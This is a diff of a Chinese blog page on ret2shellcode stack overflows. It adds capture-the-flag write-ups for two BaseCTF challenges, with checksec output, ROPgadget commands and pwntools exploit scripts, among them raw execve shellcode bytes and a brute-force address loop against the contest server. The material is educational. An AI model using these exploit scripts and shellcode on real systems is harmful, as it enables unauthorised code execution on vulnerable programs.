@@ -17,11 +17,19 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="ret2shellcode程序中没有shell，需要我们自己写一个shell进去">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/7.png">
 <meta property="article:published_time" content="2024-07-22T02:59:46.000Z">
-<meta property="article:modified_time" content="2024-08-06T03:32:01.382Z">
+<meta property="article:modified_time" content="2024-08-21T05:38:20.242Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -364,7 +372,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">139字</span>
+      <span class="post-count">824字</span>
     </span>
   </span>
 
@@ -373,7 +381,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">3分</span>
     </span>
   </span>
 </div>
@@ -393,7 +401,42 @@
 <p><em><strong>前提</strong></em>：没有开启NX保护</p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((0x... + 0x...) , <span class="string">b&#x27;a&#x27;</span>) + p64(0x.....)</span><br><span class="line"><span class="comment"># p.sendline(shellcode)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x.. + 0x..) + p64(0x.....)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><p>暂时没有典型例子</p>
+<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><h4 id="BaseCTF—-Week1-《我把她丢了》–特别注意是64位"><a href="#BaseCTF—-Week1-《我把她丢了》–特别注意是64位" class="headerlink" title="BaseCTF—[Week1] 《我把她丢了》–特别注意是64位"></a>BaseCTF—[Week1] 《我把她丢了》–特别注意是64位</h4><p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/zhouypeng/filename.git%EF%BC%8C%E5%86%99%E5%AE%8C%E5%90%8E%E6%89%8D%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%8D%E6%98%AFretshell%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%87%92%E7%9A%84%E6%8D%A2%E4%BD%8D%E7%BD%AE%E4%BA%86">https://github.com/zhouypeng/filename.git，写完后才发现这不是retshell，不过懒的换位置了</a></p>
+<h5 id="1-checksec查看"><a href="#1-checksec查看" class="headerlink" title="1.checksec查看"></a>1.checksec查看</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-IDA查看伪代码"><a href="#2-IDA查看伪代码" class="headerlink" title="2.IDA查看伪代码"></a>2.IDA查看伪代码</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/1.png"></p>
+<p>read函数存在栈溢出漏洞</p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/2.png"></p>
+<p>寻找后门函数，左边列表发现一个shell，不过点进去看不是后门函数</p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/3.png"></p>
+<p>shift+f12，发现&#x2F;bin&#x2F;sh</p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/4.png"></p>
+<h5 id="3-EXP构造"><a href="#3-EXP构造" class="headerlink" title="3.EXP构造"></a>3.EXP构造</h5><p>这里已经有了溢出0x78，由于这里是<em><strong>64位程序，需要先将&#x2F;bin&#x2F;sh写进寄存器，这样我们在调用system函数的时候就会从寄存器拿出我们的&#x2F;bin&#x2F;sh作为参数去使用，从而获得shell</strong></em></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 获取<span class="selector-tag">ret</span>和<span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> </span><br><span class="line"><span class="selector-tag">ROPgadget</span> <span class="selector-tag">--binary</span> 文件 <span class="selector-tag">--only</span> &quot;<span class="selector-tag">pop</span>|<span class="selector-tag">ret</span>&quot;</span><br><span class="line"></span><br><span class="line"># 获取/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span></span><br><span class="line"><span class="selector-tag">ROPgadget</span> <span class="selector-tag">--binary</span> 文件 <span class="selector-tag">--string</span> &quot;/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/5.png"></p>
+<p>system的plt地址我们在EXP中直接获取</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn14&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;challenge.basectf.fun&#x27;, 35596)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn14&#x27;</span>)</span><br><span class="line">shellcode = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x402008</span></span><br><span class="line">buf_1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>) + p64(<span class="number">0x40101a</span>) + p64(<span class="number">0x401196</span>) + p64(bin_sh) + p64(shellcode)</span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-获得shell"><a href="#4-获得shell" class="headerlink" title="4.获得shell"></a>4.获得shell</h5><p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/6.png"></p>
+<p><strong>请将上面的当成是ret2text，下面的才是ret2shellcode</strong></p>
+<h4 id="BaseCTF—-Week1-shellcode-level0"><a href="#BaseCTF—-Week1-shellcode-level0" class="headerlink" title="BaseCTF—[Week1] shellcode_level0"></a>BaseCTF—[Week1] shellcode_level0</h4><p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/zhouypeng/filename.git">https://github.com/zhouypeng/filename.git</a></p>
+<p>就不截图了，直接写思路了</p>
+<p>1.checksec查完发现开启了PIE保护</p>
+<p>2.ida伪代码发现下面的东西，其中read()存在栈溢出，而下一行代码会将缓冲区中’buf’中数据解释为一个函数指针，并调用它，这里思路就很清晰了，利用buf栈溢出往缓冲区中写入我们的shell，然后利用第二行代码获得shell</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x100uLL);</span><br><span class="line">((void (*)(void))buf)();</span><br></pre></td></tr></table></figure>
+
+<p>3.栈溢出大小为：0x18，这里要解决的是buf_addr的地址，由于开启了PIE保护，通过gdb调试可以发现0x7ffff7ff0000，主要是后四位随机化了</p>
+<p>4.主要构造一个链是 shellcode—栈溢出—buf_addr</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>, <span class="number">22313</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span>  <span class="comment"># 根据栈溢出大小调整</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设高 48 位地址已知为 0x7ffff7ff0000</span></span><br><span class="line">high_addr = <span class="number">0x7ffff7ff0000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有可能的后四位地址</span></span><br><span class="line"><span class="keyword">for</span> low_addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    buf_addr = high_addr | low_addr  <span class="comment"># 合并高位和低位</span></span><br><span class="line">    payload = padding + p64(buf_addr)</span><br><span class="line">    final_payload = shellcode + payload</span><br><span class="line">    p.sendline(final_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试与服务端交互，检测是否成功</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 如果成功，则跳出循环</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>, <span class="number">22313</span>)  <span class="comment"># 重新连接</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>大佬的<strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;challenge.basectf.fun&#x27;</span>,<span class="number">43755</span>)</span><br><span class="line">shellcode </span><br><span class="line">=<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\</span></span><br><span class="line"><span class="string">x99\x0f\x05&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input shellcode:&#x27;</span>,shellcode)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>shell</strong></p>
+<p><img src="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/7.png"></p>
 
 	
 
@@ -574,7 +617,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">相关例题</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">相关例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BaseCTF%E2%80%94-Week1-%E3%80%8A%E6%88%91%E6%8A%8A%E5%A5%B9%E4%B8%A2%E4%BA%86%E3%80%8B%E2%80%93%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%E6%98%AF64%E4%BD%8D"><span class="toc-number">2.1.</span> <span class="toc-text">BaseCTF—[Week1] 《我把她丢了》–特别注意是64位</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-checksec%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.checksec查看</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-IDA%E6%9F%A5%E7%9C%8B%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.IDA查看伪代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-EXP%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.3.</span> <span class="toc-text">3.EXP构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E8%8E%B7%E5%BE%97shell"><span class="toc-number">2.1.4.</span> <span class="toc-text">4.获得shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BaseCTF%E2%80%94-Week1-shellcode-level0"><span class="toc-number">2.2.</span> <span class="toc-text">BaseCTF—[Week1] shellcode_level0</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -743,6 +786,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">-XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
               </li>
              
@@ -752,10 +799,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">-XSS</a>
               </li>
              
               <li class="article-tag-list-item">
